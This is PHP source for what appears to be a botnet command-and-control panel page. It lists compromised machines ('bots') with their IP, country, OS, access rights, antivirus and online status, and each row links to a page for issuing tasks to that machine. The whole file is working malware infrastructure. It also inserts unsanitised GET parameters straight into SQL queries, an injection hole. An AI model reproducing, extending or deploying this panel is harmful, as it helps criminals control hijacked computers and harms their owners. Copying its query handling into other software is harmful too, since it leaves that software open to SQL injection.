<?php
    
    session_start();

    error_reporting( 0 );

    if ( !( isset( $_SESSION['Name'] ) ) )
    {
       header( "Location: login.php" );
       exit;
    }

    include( "header.php" );

    include( "config.php" );


    if ( @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ) == false )
    {
       echo "SQL connection filed, check host, name, login and password";
       die;
    }

    mysql_select_db( $conf['dbname'] );

    function GetBG()
    {
       static $e = "0";

       if ( $e == "1" )
       {
          $e = "0";
          return "#E4E4E4";
       }
       
       if ( $e == "0" )
       {
          $e = "1";
          return "#dfdede";
       }
    }

    if ( $_GET["f"] )
    { 
       $f = ( $_GET["f"] );
    }
    else
    {
       $f = 0;
    }

    if ( $_GET["sort"] == "" )
    {
       $so = "id";
       $J = "id";
    }
    else
    {
       $so = $_GET["sort"];
       $J = $_GET["sort"];
    }


    if ( $_GET["show"] == all )
    {     
       $all = mysql_query( "SELECT * FROM units" );
       $result = mysql_query( "SELECT * FROM units ORDER BY $J DESC LIMIT $f, 100" );
    
    }
    else
    {
       $all = mysql_query( "SELECT * FROM units WHERE online > " . ( time() - 60 ) );
       $result = mysql_query( "SELECT * FROM units WHERE online > " . ( time() - 60 ) . " ORDER BY $J DESC LIMIT $f, 100" );
    }  

    echo "<div align = center> 
             <table cellpadding=1 cellspacing=1 width=1200 class=table>
                <tr>
                   <td><div align = center> <a href=\"show_bots.php?sort=id" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;Id:</div></td>


                   <td><div align = center> <a href=\"show_bots.php?sort=ip" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;Ip:</div></td>
                   <td><div align = center> <a href=\"show_bots.php?sort=country" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;Country:</div></td>
                   <td><div align = center> <a href=\"show_bots.php?sort=version" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;Version:</div></td>
                   <td><div align = center> <a href=\"show_bots.php?sort=os" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;System:</div></td>
                   <td><div align = center> <a href=\"show_bots.php?sort=arch" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;Architecture:</div></td>
                   <td><div align = center> <a href=\"show_bots.php?sort=ar" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;Access rights:</div></td>
                   <td><div align = center> <a href=\"show_bots.php?sort=av" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;AV:</div></td>
                   <td><div align = center> <a href=\"show_bots.php?sort=online" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;Last seen:</div></td>
                   <td><div align = center> <a href=\"show_bots.php?sort=reg" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"images\ic_sort.png\"></a>&nbsp;Added:</div></td>
                   <td><div align = center>&nbsp;Action:</div></td>
                 </tr>";


    while ( $row = mysql_fetch_array( $result ) )
    { 
       $gb = GetBG();

       {          
       echo "<tr>
               <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_4.png\"> " . $row['id'] . "</td>
               <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_12.png\"> " . $row['ip'] . "</td>
               <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_13.png\"> " . $row['country'] . "</td>
               <td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"images\ic_6.png\"> " . $row['version'] . "</div></td>
               <td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"images\ic_8.png\"> " . $row['os'] . "</div></td>
               <td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"images\ic_9.png\"> " . $row['arch'] . "</div></td>
               <td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"images\ic_10.png\"> " . $row['ar'] . "</div></td>
               <td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"images\ic_av.png\"> " . $row['av'] . "</div></td>
               <td bgcolor = " . $gb . ">
                  <div align = center>";
                  
               if ( time() - $row['online'] < 60 )
               {
                  echo "&nbsp;<img src=\"images\ic_11.png\"> " . date( "s", ( time() - $row['online'] ) ) . " sec" ; 
               }
               else
               {
                  echo "&nbsp;<img src=\"images\ic_11.png\"> " . date( "d/m/Y H:i", ( $row['online'] ) ) ;
               }

         echo "   </div>
               </td>";


         echo  "<td bgcolor = " . $gb. "><div align = center>" . "&nbsp;<img src=\"images\ic_11.png\"> " . date( "d/m/Y H:i", ( $row['reg'] ) ) . "</div></td>";



         echo  "<td bgcolor = " . $gb. ">" . "<div align = center>" . "&nbsp;<img src=\"images\ic_5.png\"> " . "<a href=\"make_task.php?count=1&unit=" . $row['id'] . "\">Task</a></div>" . "</td>

             </tr>";
       }
       
    }

    echo "   </table>
          </div>";



    echo "<div align = center>
             <table border=\"0\" width=\"1200\" class=table_hig cellspacing=\"0\" cellpadding=\"0\" height=\"20\">
	        <tr>
		   <td>
                      <div align = right>";

    
    if ( $_GET["show"] == all )
    {
       $sa = "&show=all";
    }

    while ( mysql_num_rows( $all ) > $i )
    {    

      if ( mysql_num_rows( $all ) > $i ) 
      { 
         $c++; 
         
         if ( mysql_num_rows( $all ) > 100 ) 
         {
            echo "<a href=\"show_bots.php?sort=" . $so . "&f=" . $i . $sa . "\">" . $c . "</a>" . " ";
         }
      }

      $i = $i + 100;

    }

    echo "           </div>
		   </td>
	        </tr>
             </table>
          </div>";

    echo "</html>";

    mysql_close();
?>